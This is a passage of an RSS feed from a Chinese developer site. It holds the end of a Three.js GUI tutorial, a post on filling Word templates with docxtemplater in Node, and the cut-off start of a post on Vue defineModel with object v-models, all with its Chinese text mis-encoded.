  <span class="hljs-comment">// è‡ªå®šä¹‰æŒ‰é’®äº‹ä»¶ï¼šå¯åŠ¨è¿åŠ¨</span>
  startMove: () =&gt; {
    gsap.to(cube.position, { x: <span class="hljs-number">5</span>, duration: <span class="hljs-number">2</span>, yoyo: <span class="hljs-literal">true</span>, repeat: <span class="hljs-number">-1</span> });
  }
};
gui.addColor(<span class="hljs-keyword">params</span>, <span class="hljs-string">"color"</span>).onChange(<span class="hljs-keyword">value</span> =&gt; {
  cube.material.color.<span class="hljs-keyword">set</span>(<span class="hljs-keyword">value</span>);
});

<span class="hljs-comment">// 3. æ§åˆ¶ç‰©ä½“å¯è§æ€§</span>
gui.<span class="hljs-keyword">add</span>(cube, <span class="hljs-string">"visible"</span>).name(<span class="hljs-string">"æ˜¯å¦æ˜¾ç¤º"</span>);

<span class="hljs-comment">// 4. åˆ›å»ºæ–‡ä»¶å¤¹åˆ†ç±»</span>
<span class="hljs-keyword">const</span> folder = gui.addFolder(<span class="hljs-string">"ç«‹æ–¹ä½“è®¾ç½®"</span>);
<span class="hljs-comment">// æ§åˆ¶çº¿æ¡†æ¨¡å¼</span>
folder.<span class="hljs-keyword">add</span>(cube.material, <span class="hljs-string">"wireframe"</span>).name(<span class="hljs-string">"çº¿æ¡†æ¨¡å¼"</span>);
<span class="hljs-comment">// ç»‘å®šè‡ªå®šä¹‰äº‹ä»¶</span>
folder.<span class="hljs-keyword">add</span>(<span class="hljs-keyword">params</span>, <span class="hljs-string">"startMove"</span>).name(<span class="hljs-string">"å¯åŠ¨è¿åŠ¨"</span>);
</code></pre>
<h2 data-id="heading-20">ç»“è¯­</h2>
<p>å‰ç«¯çš„ä¸–ç•Œä»ä¸å±€é™äº Vue ä¸ React çš„æ¡†æ¶ä¹‹äº‰ï¼Œå½“ WebGL æˆä¸ºä¸‹ä¸€ä»£å‰ç«¯çš„åŸºç¡€è®¾æ–½ï¼Œå½“å…ƒå®‡å®™ã€æ•°å­—å­ªç”Ÿã€AR/VR ç­‰æŠ€æœ¯é€æ¸è½åœ°ï¼ŒWeb3D æ­£æˆä¸ºå¼€å‘è€…ä¸å¯æˆ–ç¼ºçš„æŠ€èƒ½ã€‚</p>
<p>ä»äºŒç»´åˆ°ä¸‰ç»´ï¼Œä¸ä»…æ˜¯æŠ€æœ¯æ ˆçš„æ‹“å±•ï¼Œæ›´æ˜¯æ€ç»´æ–¹å¼çš„å‡çº§ã€‚æ„¿ä½ åœ¨ Three.js çš„ä¸‰ç»´åæ ‡ç³»ä¸­ï¼Œæ¢ç´¢æ›´å¤šå¯èƒ½ï¼Œå¾æœå±äºå‰ç«¯å¼€å‘è€…çš„æ˜Ÿè¾°å¤§æµ·ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ä½¿ç”¨docxtemplaterè¿›è¡ŒWordæ–‡æ¡£çš„è‡ªåŠ¨å¡«å……]]></title>    <link>https://juejin.cn/post/7592996072705048626</link>    <guid>https://juejin.cn/post/7592996072705048626</guid>    <pubDate>2026-01-09T03:30:06.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705048626" data-draft-id="7592887786966171684" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ä½¿ç”¨docxtemplaterè¿›è¡ŒWordæ–‡æ¡£çš„è‡ªåŠ¨å¡«å……"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2026-01-09T03:30:06.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Arnbit1on"/> <meta itemprop="url" content="https://juejin.cn/user/114004941607207"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ä½¿ç”¨docxtemplaterè¿›è¡ŒWordæ–‡æ¡£çš„è‡ªåŠ¨å¡«å……
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/114004941607207/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Arnbit1on
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:30:06.000Z" title="Fri Jan 09 2026 03:30:06 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>â€ƒâ€ƒæœ€è¿‘ç»™å…¶ä»–éƒ¨é—¨åšäº†ä¸ªç®€å•çš„è„šæœ¬è¦æŠŠä¸€å †æ•°æ®å¡«å……åˆ°wordæŠ¥å‘Šé‡Œã€‚æ¨¡æ¿å›ºå®šçš„éƒ½å¥½è¯´ã€‚ç”¨ <code>docxtemplater</code> å°±è¡Œã€‚</p>
<p>â€ƒâ€ƒä½¿ç”¨ <code>npm install docxtemplater</code> ç›´æ¥ä¸‹è½½å³å¯ã€‚wordçš„æ ¼å¼å¦‚ä¸‹å¤„ç†å°±è¡Œï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5d8830d1bd024e4cbd6772f7bbfa5204~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXJuYml0MW9u:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534206&amp;x-signature=8l8ZGVA%2Fzpsr9AoAf0obvw6mzd8%3D" alt="image.png" loading="lazy"/></p>
<p>â€ƒâ€ƒ<code>deviations</code>æ˜¯åé¢jsä»£ç é‡Œä¼ é€’çš„å¯¹è±¡åç§°ã€‚ä»¥<code>{#deviations}</code>å¼€å¤´ï¼Œ<code>{/deviations}</code>ç»“å°¾ã€‚ç±»ä¼¼äºforå¾ªç¯ã€‚indexã€codeè¿™äº›å­—æ®µå°±æ˜¯item.index,item.codeç­‰ã€‚åªä¸è¿‡çœå»äº†itemã€‚</p>
<p>test.jsonæ–‡ä»¶æ ¼å¼å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-attr">[  {    <span class="hljs-string">"code"</span>: <span class="hljs-string">"æµ‹è¯•code1"</span>,    <span class="hljs-string">"reason"</span>: <span class="hljs-string">"æµ‹è¯•reason1"</span>,    <span class="hljs-string">"inspect"</span>: <span class="hljs-string">"æµ‹è¯•inspect1"</span>,    <span class="hljs-string">"complation"</span>: <span class="hljs-string">"æµ‹è¯•complation1"</span>  },  {    <span class="hljs-string">"code"</span>: <span class="hljs-string">"æµ‹è¯•code2"</span>,    <span class="hljs-string">"reason"</span>: <span class="hljs-string">"æµ‹è¯•reason2"</span>,    <span class="hljs-string">"inspect"</span>: <span class="hljs-string">"æµ‹è¯•inspect2"</span>,    <span class="hljs-string">"complation"</span>: <span class="hljs-string">"æµ‹è¯•complation2"</span>  }]</span>

</code></pre>
<p>å¯ä»¥ç®€å•å®ç°çš„ä»£ç å¦‚ä¸‹æ ¹æ®è‡ªå·±éœ€æ±‚å»æ›´æ”¹å°±è¡Œï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">"fs/promises"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Docxtemplater</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"docxtemplater"</span>;
<span class="hljs-keyword">import</span> <span class="hljs-title class_">PizZip</span> <span class="hljs-keyword">from</span> <span class="hljs-string">"pizzip"</span>;

<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// è¯»å–æ¨¡æ¿</span>
  <span class="hljs-keyword">const</span> templateContent = <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"æµ‹è¯•.docx"</span>);

  <span class="hljs-comment">// åŠ è½½æ•°æ®</span>
  <span class="hljs-keyword">const</span> data = <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">parse</span>(<span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">readFile</span>(<span class="hljs-string">"test.json"</span>, <span class="hljs-string">"utf8"</span>));

  <span class="hljs-comment">// æ„é€ ç¬¦åˆæ¨¡æ¿è¦æ±‚çš„æ•°æ®ç»“æ„</span>
  <span class="hljs-keyword">const</span> reportData = {
    <span class="hljs-attr">deviations</span>: data.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item, i</span>) =&gt;</span> ({
      <span class="hljs-attr">index</span>: i + <span class="hljs-number">1</span>,
      <span class="hljs-attr">code</span>: item.<span class="hljs-property">code</span> || <span class="hljs-string">""</span>,
      <span class="hljs-attr">reason</span>: item.<span class="hljs-property">reason</span> || <span class="hljs-string">""</span>,
      <span class="hljs-attr">inspect</span>: item.<span class="hljs-property">inspect</span> || <span class="hljs-string">""</span>,
      <span class="hljs-attr">complation</span>: item.<span class="hljs-property">complation</span> || <span class="hljs-string">""</span>,
    })),
  };

  <span class="hljs-comment">// æ¸²æŸ“æ¨¡æ¿</span>
  <span class="hljs-keyword">const</span> zip = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PizZip</span>(templateContent);
  <span class="hljs-keyword">const</span> doc = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Docxtemplater</span>(zip, {
    <span class="hljs-attr">paragraphLoop</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">linebreaks</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-attr">nullGetter</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-string">""</span>,
  });
  doc.<span class="hljs-title function_">render</span>(reportData);

  <span class="hljs-keyword">const</span> buffer = doc
    .<span class="hljs-title function_">getZip</span>()
    .<span class="hljs-title function_">generate</span>({ <span class="hljs-attr">type</span>: <span class="hljs-string">"nodebuffer"</span>, <span class="hljs-attr">compression</span>: <span class="hljs-string">"DEFLATE"</span> });
  <span class="hljs-keyword">await</span> fs.<span class="hljs-title function_">writeFile</span>(<span class="hljs-string">"testè¾“å‡º.docx"</span>, buffer);
}

<span class="hljs-title function_">main</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);
</code></pre>
<p>è¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96de6aac68b9455c85f4b176778aa803~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQXJuYml0MW9u:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534206&amp;x-signature=qACpzHbdODk%2BqL3vAXSo4Tp2bW8%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[defineModelçš„è¡Œä¸ºä¸æ–‡æ¡£ä¸ä¸€è‡´]]></title>    <link>https://juejin.cn/post/7592992745573236774</link>    <guid>https://juejin.cn/post/7592992745573236774</guid>    <pubDate>2026-01-09T03:32:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592992745573236774" data-draft-id="7592903126178332722" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="defineModelçš„è¡Œä¸ºä¸æ–‡æ¡£ä¸ä¸€è‡´"/> <meta itemprop="keywords" content="Vue.js"/> <meta itemprop="datePublished" content="2026-01-09T03:32:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="FanetheDivine"/> <meta itemprop="url" content="https://juejin.cn/user/4246761716322491"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            defineModelçš„è¡Œä¸ºä¸æ–‡æ¡£ä¸ä¸€è‡´
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4246761716322491/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    FanetheDivine
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T03:32:44.000Z" title="Fri Jan 09 2026 03:32:44 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å…ˆæ¥çœ‹çœ‹<a href="https://link.juejin.cn?target=https%3A%2F%2Fcn.vuejs.org%2Fguide%2Fcomponents%2Fv-model.html" target="_blank" title="https://cn.vuejs.org/guide/components/v-model.html" ref="nofollow noopener noreferrer">æ–‡æ¡£</a>å¯¹defineModelçš„æè¿°å’Œä½¿ç”¨ä¾‹</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> model = <span class="hljs-title function_">defineModel</span>()

<span class="hljs-keyword">function</span> <span class="hljs-title function_">update</span>(<span class="hljs-params"/>) {
  model.<span class="hljs-property">value</span>++
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>Parent bound v-model is: {{ model }}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"update"</span>&gt;</span>Increment<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"countModel"</span> /&gt;</span>
</code></pre>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc3bba532dfb42cc87b7f2ab1c96a2ca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534363&amp;x-signature=KBdVnFMSXMCIfQU%2FrZlsrOEuBGc%3D" alt="image.png" loading="lazy"/>
ä¸è¿‡è¿™é‡Œçš„ç®€å•ä¾‹å­ä¸­ v-modelçš„ç±»å‹æ˜¯æ•°å­—ç±»å‹ å¯¹å®ƒçš„å˜æ›´è‡ªç„¶ä¹Ÿåªæœ‰ç›´æ¥èµ‹å€¼è¿™ä¸€ç§æ–¹å¼</p>
<p>é‚£ä¹ˆ å¦‚æœv-modelæ˜¯å¯¹è±¡å‘¢ï¼Ÿ</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">const</span> countObj = defineModel&lt;{ <span class="hljs-attr">count</span>: number }&gt;()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"m-4"</span>&gt;</span>
    {{ countObj.count }}
    <span class="hljs-tag">&lt;<span class="hljs-name">el-button</span>
      @<span class="hljs-attr">click</span>=<span class="hljs-string">"
        () =&gt; {
          countObj.count++
        }
      "</span>
    &gt;</span>
      +1
    <span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"ts"</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Child.vue'</span>

<span class="hljs-keyword">const</span> countObj = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">count</span>: <span class="hljs-number">1</span>,
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">Child</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"countObj"</span> /&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>
</code></pre>
<p>å¯ä»¥æ­£å¸¸ä½¿ç”¨
<img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b1775b5199be49fb888337d3cd2c6eca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgRmFuZXRoZURpdmluZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768534363&amp;x-signature=wmwGFhQMNvKCsZym%2B0AaUgGtLKI%3D" alt="åŠ¨ç”».gif" loading="lazy"/>
v-modelçš„valueä¹Ÿæ˜¯å¾ˆæ­£å¸¸çš„ref
